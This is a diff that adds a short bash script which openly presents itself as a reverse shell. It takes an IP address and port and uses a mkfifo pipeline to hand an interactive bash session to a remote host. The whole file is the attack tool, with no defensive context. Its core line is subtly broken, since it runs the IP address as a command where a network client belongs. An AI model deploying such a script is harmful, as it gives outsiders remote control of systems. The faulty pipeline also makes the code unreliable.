@@ -1,0 +1,19 @@
+#!/bin/bash
+
+#shell=/bin/sh
+shell=/bin/bash
+
+if [ -z "$2" ]; then
+	echo  "usage: $0 <ip address> <port>"
+	exit 1
+fi
+
+echo "Starting reverse shell (using mkfifo) with the following options:"
+echo "IP adress...: $1"
+echo "TCP port....: $2"
+echo
+
+mkfifo /tmp/f; $1 $2 < /tmp/f | $shell >/tmp/f 2>&1; rm /tmp/f
+
+echo "Reverse shell closed"
+exit 0
